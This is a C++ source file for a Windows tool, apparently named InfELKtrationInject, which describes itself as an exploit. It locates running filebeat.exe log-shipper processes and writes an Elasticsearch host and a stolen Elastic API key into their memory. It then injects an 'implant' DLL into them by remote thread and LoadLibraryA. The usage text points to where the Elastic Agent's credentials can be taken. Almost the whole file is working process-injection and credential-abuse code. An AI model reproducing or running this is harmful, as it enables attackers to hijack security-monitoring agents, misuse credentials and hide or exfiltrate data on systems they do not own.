#include <iostream>
#include <windows.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <wincrypt.h>
#include <cstdlib>
#include <synchapi.h>

#include "Logger.h"

#include "LibConstants.h"

#define DLL_FILEPATH_MAX_LENGTH 120
#define B64_API_KEY_MAX_LEN 100
#define AUTH_HEADER_LEN 120
#define MAX_PIDS 5
    
// code references:
// https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes

DWORD get_filebeat_pids();
BOOL configure_data(DWORD, const wchar_t*, DWORD, const wchar_t*);
BOOL inject_dll(DWORD, const char *);

DWORD targetPids[MAX_PIDS+1] = { 0 };
DWORD recheckPids[MAX_PIDS+1] = { 0 };

int main(int argc, char **argv)
{
    DWORD ret, i, sz, es_port, attribs;
    size_t offset;
    wchar_t b64_apikey[B64_API_KEY_MAX_LEN] = { 0 };
    wchar_t auth_header[AUTH_HEADER_LEN] = { 0 };
    wchar_t es_host[100] = { 0 };

    // validate arg count
    if (argc != 4) {
        Logger::Error("Not enough arguments!");
        Logger::Error("Usage: %s [path to InfELKtrationInjectLib.dll] [URL to ElasticSearch server] [ElasticSearch API key]", argv[0]);
        Logger::Error("Example: .\\InfELKtrationInject.exe C:\\path\\to\\InfELKtrationInjectLib.dll https://my.es-server.lan:9200 asdfzxcv:asdf234232");
        Logger::Error("You can get the URL/API key from C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-xxxxxx\\action_store.yml, at something like policy.outputs.default at the bottom");
        
        return 2;
    }

    // create log directory
    // https://stackoverflow.com/a/6218445
    attribs = GetFileAttributesA("C:\\inject_logs");
    if (!(attribs != INVALID_FILE_ATTRIBUTES && attribs & FILE_ATTRIBUTE_DIRECTORY)) {
        if (!CreateDirectoryA("C:\\inject_logs", NULL)) {
            Logger::Error("Failed to make log directory at C:\\inject_logs");
        }
    }

    // parse out the ES URL
    // we can assume HTTPS
    offset = strcspn(argv[2] + 7, ":") + 7; // skip https:/
    if (offset == strlen(argv[2])) {
        es_port = 443;
    }
    else {
        es_port = atoi(argv[2] + offset + 1);
        argv[2][offset] = 0;
    }
    // strcpy but also turns it into a wide str
    mbstowcs_s(NULL, es_host, 100, argv[2] + 8, 100);

    // base64 the API key
    sz = B64_API_KEY_MAX_LEN;
    if (!CryptBinaryToStringW((const BYTE*)argv[3], (DWORD)strlen(argv[3]), CRYPT_STRING_BASE64, b64_apikey, &sz)) {
        Logger::Error("Failed to Base64 encode the API key");
        return 1;
    }

    // CryptBinaryToStringA appends \r\n to the end of the string. We don't want this
    b64_apikey[wcscspn(b64_apikey, L"\r\n")] = L'\0';

    // build the header
    swprintf(auth_header, AUTH_HEADER_LEN, L"Authorization: ApiKey %s", b64_apikey);

    // find filebeat processes
    if (!(ret = get_filebeat_pids())) {
        Logger::Error("Failed to find filebeat.exe processes");
        return 1;
    }
    Logger::Info("Found %d filebeat.exe processes", ret);

    // send arg data into the target processes
    Logger::Info("Configuring static data in target processes");
    for (i = 0; targetPids[i]; i++) {
        if (configure_data(targetPids[i], es_host, es_port, auth_header)) {
            Logger::Info("Configured static data in pid %d", targetPids[i]);
        }
        else {
            Logger::Error("Failed to configure static data in pid %d", targetPids[i]);
        }
    }

    // inject the DLL
    Logger::Info("Injecting DLL at %s", argv[1]);
    for (i = 0; targetPids[i]; i++) {
        if (inject_dll(targetPids[i], argv[1])) {
            Logger::Info("Successfully injected DLL in pid %d", targetPids[i]);
        }
        else {
            Logger::Error("Failed to inject DLL in pid %d", targetPids[i]);
        }
    }

    Logger::Info("Finished injecting, waiting to confirm stability");

    // sleep for 5 seconds
    Sleep(5000);

    // copy existing pids
    for (i = 0; i < MAX_PIDS; i++) {
        recheckPids[i] = targetPids[i];
    }

    Logger::Info("Checking filebeat.exe PIDs again");

    // get the PIDs again
    get_filebeat_pids();

    for (i = 0; i < MAX_PIDS; i++) {
        if (targetPids[i] != recheckPids[i]) {
            Logger::Error("A filebeat.exe process crashed, please manually kill all filebeat.exe processes and re-run this exploit");
            return 1;
        }
    }

    Logger::Info("All filebeat.exe processes are intact, exploit should be stable. Logs from the implant will be in C:\\inject_logs");

    return 0;
}

DWORD get_filebeat_pids() {
    HANDLE hSnapshot;
    PROCESSENTRY32 processEntry;
    DWORD targetPidCount = 0;

    // get snapshot of running processes on the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        Logger::Error("CreateToolhelp32Snapshot failed");
        Logger::LastError();
        return 0;
    }

    // PROCESSENTRY32 docs state that the size needs to be initialized b/f calling Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // get the first process
    if (!Process32First(hSnapshot, &processEntry)) {
        Logger::Error("Process32First failed");
        Logger::LastError();
        return 0;
    }

    // loop through processes
    do {
        if (targetPidCount == MAX_PIDS) {
            Logger::Error("Found too many filebeat.exe processes");
            return 0;
        }
        if (CompareStringOrdinal(L"filebeat.exe", -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
            Logger::Info("Found filebeat.exe (pid=%d)", processEntry.th32ProcessID);
            targetPids[targetPidCount++] = processEntry.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);

    return targetPidCount;
}

BOOL configure_data(DWORD pid, const wchar_t* es_host, DWORD es_port, const wchar_t* api_key) {
    HANDLE hProcess;
    LPVOID data;
    size_t len;

    Logger::Info("Configuring static data in pid %d", pid);
    
    // open handle to target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (!hProcess) {
        Logger::Error("OpenProcess failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Opened handle to target process: 0x%p", hProcess);

    // allocate memory 
    data = VirtualAllocEx(hProcess, (LPVOID)API_KEY_LOCATION, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) {
        Logger::Error("VirtualAllocEx failed");
        Logger::LastError();
        return false;
    }
    if (data != (LPVOID)API_KEY_LOCATION) {
        Logger::Error("Static data memory didn't get allocated at required address");
        VirtualFreeEx(hProcess, data, 0, MEM_RELEASE);
    }
    
    Logger::Info("Allocated mem for static data: 0x%p", data);

    // write API key into target process
    len = wcslen(api_key);
    if (!WriteProcessMemory(hProcess, (LPVOID)API_KEY_LOCATION, api_key, len * sizeof(wchar_t), NULL)) {
        Logger::Error("WriteProcessMemory failed");
        Logger::LastError();
        return false;
    }
    
    // write ES host into target process
    len = wcslen(es_host);
    if (!WriteProcessMemory(hProcess, (LPVOID)ES_HOST_LOCATION, es_host, len * sizeof(wchar_t), NULL)) {
        Logger::Error("WriteProcessMemory failed");
        Logger::LastError();
        return false;
    }
    
    // write ES port into target process
    if (!WriteProcessMemory(hProcess, (LPVOID)ES_PORT_LOCATION, (LPCVOID)&es_port, 4, NULL)) {
        Logger::Error("WriteProcessMemory failed");
        Logger::LastError();
        return false;
    }

    Logger::Info("Wrote ES host/port and API key to target process memory");

    CloseHandle(hProcess);

    return true;
}

BOOL inject_dll(DWORD pid, const char *dllFilename) {
    HANDLE hProcess;
    LPVOID szDllFilepath;
    HMODULE hKernel32;
    LPTHREAD_START_ROUTINE loadLibrary;
    
    Logger::Info("Injecting into pid %d", pid);
    
    // open handle to target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (!hProcess) {
        Logger::Error("OpenProcess failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Opened handle to target process: 0x%p", hProcess);
    
    // allocate memory for the dll filepath
    szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!szDllFilepath) {
        Logger::Error("VirtualAllocEx failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Allocated mem for DLL filepath: 0x%p", szDllFilepath);
    
    // write dll path into target process
    if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
        Logger::Error("WriteProcessMemory failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Copied DLL path into target process");

    // get the base addr for kernel32.dll
    hKernel32 = GetModuleHandleA("Kernel32");
    if (!hKernel32) {
        Logger::Error("GetModuleHandleA failed");
        Logger::LastError();
        return false;
    }

    // get the address of LoadLibraryA
    loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    if (!loadLibrary) {
        Logger::Error("GetProcAddress failed");
        Logger::LastError();
        return false;
    }

    // load the DLL in the target process, this executes dllmain for DLL_PROCESS_ATTACH
    CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
    
    Logger::Info("Executed DLL in target process");
    
    CloseHandle(hProcess);

    return true;
}